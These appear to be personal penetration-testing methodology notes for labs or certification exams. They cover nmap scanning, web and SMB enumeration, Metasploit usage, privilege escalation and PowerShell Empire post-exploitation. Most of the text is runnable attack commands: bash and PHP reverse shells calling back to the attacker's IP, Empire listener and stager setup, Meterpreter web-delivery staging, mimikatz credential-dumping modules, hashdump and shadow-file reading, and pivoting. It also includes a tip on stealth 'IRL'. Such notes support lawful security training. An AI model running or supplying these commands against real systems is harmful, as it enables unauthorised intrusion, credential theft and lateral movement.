# **Penetration Testing Methodology Notes**

---

# **Information Gathering**

## **Target Scoping**

# Define targets
export TARGET_IP=<IP>
export TARGET_SUBNET=<CIDR>
````

## **Ping Sweep**

# Quick live host discovery
fping -a -g $TARGET_SUBNET 2>/dev/null

## **Nmap Scans**

# Quick top 1000 ports
nmap -Pn -T4 -sC -sV $TARGET_IP -oN quick.txt

# Full TCP scan
nmap -p- -T4 $TARGET_IP -oN allports.txt

# Version + scripts on found ports
nmap -sC -sV -p<ports> $TARGET_IP -oN versions.txt

# UDP top 100
nmap -sU --top-ports 100 $TARGET_IP -oN udp.txt

**OS-Based Deep Scan Decision Tree**

**Step 1 – Identify Likely OS**
Run a quick service/OS detection scan:

nmap -Pn -T4 -sC -sV --top-ports 1000 $TARGET_IP -oN quick.txt

Check:

* SMB/NetBIOS/Kerberos → likely Windows
* SSH/Apache/Nginx → likely Linux

**Step 2 – Choose Deep Scan Path**

**If Windows:**

# Full TCP
nmap -Pn -T4 -p- --min-rate=2000 $TARGET_IP -oN allports.txt

# Targeted enumeration + vuln scan
nmap -Pn -T4 -sC -sV \
  -p$(grep -oP '\d{1,5}/tcp' allports.txt | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//') \
  --script=smb-os-discovery,smb-enum-shares,smb-enum-users,vuln \
  $TARGET_IP -oN win_deep.txt

# Top 200 UDP ports (Kerberos, RPC, SNMP)
nmap -sU --top-ports 200 --open -T4 $TARGET_IP -oN udp_win.txt
```

**If Linux:**

# Full TCP
nmap -Pn -T4 -p- --min-rate=2000 $TARGET_IP -oN allports.txt

# Targeted enumeration + vuln scan
nmap -Pn -T4 -sC -sV \
  -p$(grep -oP '\d{1,5}/tcp' allports.txt | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//') \
  --script=http-title,http-server-header,http-enum,ftp-anon,vuln \
  $TARGET_IP -oN linux_deep.txt

# Top 50 UDP ports (DNS, NTP, SNMP)
nmap -sU --top-ports 50 --open -T4 $TARGET_IP -oN udp_linux.txt

**Step 3 – Post-Scan Action**

searchsploit <service> <version>
# SMB → smbmap, rpcclient
# HTTP → gobuster/ffuf
# FTP → ftp/ftp-anon

*Tip: if OS is unclear, run both deep paths—CTFs sometimes mix.*

---

# **Enumeration**

## **Web**

# Basic recon
whatweb http://$TARGET_IP
curl -I http://$TARGET_IP

# Directory fuzzing
gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirb/common.txt

# VHost fuzzing
ffuf -u http://$TARGET_IP -H "Host: FUZZ.target.local" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

## **SMB**

# List shares (null session)
smbclient -L //$TARGET_IP/ -N

# Connect to share
smbclient //$TARGET_IP/<share> -U <user>

# SMBExec
smbexec.py '<USER:PASSWORD>'@$TARGET

## **SNMP**

snmpwalk -v2c -c public $TARGET_IP

## **FTP**

ftp $TARGET_IP

# **Exploitation**

## **Metasploit Basics**

# Search module
search <service>

# Use module
use exploit/<path>
set RHOSTS $TARGET_IP
set LHOST <your_ip>
exploit

# kill port
sudo ss -tulpn | grep :<PORT>
sudo kill -9 <PID>

# force open a shell session (Meterpreter)
execute -f cmd.exe -i -H

## **Manual Reverse Shells**

# Bash TCP reverse shell
bash -i >& /dev/tcp/<your_ip>/<port> 0>&1

# PHP reverse shell
php -r '$sock=fsockopen("<your_ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'

# Sending email on kali (sendemail)
sendemail \
  -f ADDRESS \
  -t ADDRESS [ADDR ...] \
  -s SERVER[:PORT] \
  -u SUBJECT \
  -m MESSAGE \
  -a FILE [FILE ...]

# **Privilege Escalation**

## **Linux**

# Check kernel & OS
uname -a
lsb_release -a

# Find SUID binaries
find / -perm -4000 2>/dev/null

# Search for creds
grep -R "password" /etc 2>/dev/null

## **Windows**

:: System info
systeminfo

:: List users
net user

:: Show scheduled tasks
schtasks /query /fo LIST /v

# **Post-Exploitation**

## **PowerShell Empire**

**Server & Listener Setup**

# Start Empire server
powershell-empire server
# In a new terminal/tab, start Empire client
powershell-empire client

Inside the client:

```text
listeners
uselistener http
set Name http_443
set Host http://<Kali-IP>
set Port 443
execute

*HTTP listener is fine for internal labs; use HTTPS/named pipe for stealth IRL.*

**Stager Generation**

Empire > usestager multi/launcher
set Listener http
execute

Copy the one-liner into your target to spawn an agent.

**Agent Management**

agents
interact <NAME>
usemodule powershell/situational_awareness/host/computerdetails

* From msfconsole, you can run `exploit/multi/script/web_delivery`:

set TARGET 2                   # PowerShell
set SRVHOST <KALI IP>
set LHOST <KALI IP>
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
# copy URL, e.g. http://0.0.0.0:8080/Hkh1wq6lHvQ

Back in Empire:

usemodule powershell/code_execution/invoke_metasploitpayload
set URL http://0.0.0.0:8080/Hkh1wq6lHvQ
execute

Now you should get a Meterpreter session (`sysinfo`, `shell`, etc.).

**Common Recon Modules**

* `situational_awareness/network/ping_sweep`
* `situational_awareness/host/computerdetails`
* `situational_awareness/network/get_domaincontroller`

**Credential Dumping**

* `credentials/mimikatz/logonpasswords`
* `credentials/mimikatz/lsadump`

**Lateral Movement**

* `lateral_movement/invoke_smbexec`
* `lateral_movement/invoke_wmi`
* Use `pivot` for SOCKS

## **Hash Dumping**

# Linux
cat /etc/shadow

# Windows (Meterpreter)
hashdump

## **Pivoting**

# Meterpreter autoroute
run autoroute -s <subnet>

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
run

## **Looting & Reporting**

# Copy files back
scp user@$TARGET_IP:/path/to/file .

# Keep all flags in one folder
mkdir ~/exam_flags

# **Common Ports & Services**

| **Port**    | **Protocol** | **Service / Purpose**                        |
| ----------- | ------------ | -------------------------------------------- |
| 20          | TCP          | FTP (Data)                                   |
| 21          | TCP          | FTP (Control)                                |
| 22          | TCP          | SSH (Secure Shell)                           |
| 23          | TCP          | Telnet                                       |
| 25          | TCP          | SMTP (Mail Transfer)                         |
| 53          | TCP/UDP      | DNS (Domain Name System)                     |
| 67          | UDP          | DHCP (Server)                                |
| 68          | UDP          | DHCP (Client)                                |
| 69          | UDP          | TFTP (Trivial File Transfer Protocol)        |
| 80          | TCP          | HTTP (Web)                                   |
| 88          | TCP/UDP      | Kerberos (Windows Auth)                      |
| 110         | TCP          | POP3 (Email)                                 |
| 111         | TCP/UDP      | RPCbind / Portmapper                         |
| 135         | TCP          | MS RPC (Microsoft Remote Procedure Call)     |
| 137         | UDP          | NetBIOS Name Service                         |
| 138         | UDP          | NetBIOS Datagram Service                     |
| 139         | TCP          | NetBIOS Session Service (SMB over NetBIOS)   |
| 143         | TCP          | IMAP (Email)                                 |
| 161         | UDP          | SNMP (Simple Network Management Protocol)    |
| 162         | UDP          | SNMP Trap                                    |
| 389         | TCP/UDP      | LDAP (Lightweight Directory Access Protocol) |
| 443         | TCP          | HTTPS (HTTP Secure)                          |
| 445         | TCP          | SMB (Microsoft-DS over TCP)                  |
| 465         | TCP          | SMTPS (SMTP over SSL)                        |
| 514         | UDP          | Syslog                                       |
| 587         | TCP          | SMTP (Mail Submission)                       |
| 636         | TCP          | LDAPS (LDAP over SSL)                        |
| 993         | TCP          | IMAPS                                        |
| 995         | TCP          | POP3S                                        |
| 1080        | TCP          | SOCKS Proxy                                  |
| 1433        | TCP          | Microsoft SQL Server                         |
| 1521        | TCP          | Oracle Database                              |
| 2049        | TCP/UDP      | NFS (Network File System)                    |
| 3306        | TCP          | MySQL                                        |
| 3389        | TCP          | RDP (Remote Desktop Protocol)                |
| 5432        | TCP          | PostgreSQL                                   |
| 5900        | TCP          | VNC (Virtual Network Computing)              |
| 5985        | TCP          | WinRM (HTTP)                                 |
| 5986        | TCP          | WinRM (HTTPS)                                |
| 8000 / 8080 | TCP          | Alternate HTTP                               |
| 8443        | TCP          | Alternate HTTPS                              |
| 9000        | TCP          | Various Apps / Dev Services                  |
| 9200        | TCP          | Elasticsearch                                |
| 27017       | TCP          | MongoDB                                      |

## **Next Steps**

1. As you redo **every** lab, add exact commands + gotchas.
2. Remove anything you never use.
3. Add your own fallback tricks so exam flow becomes muscle memory.

```
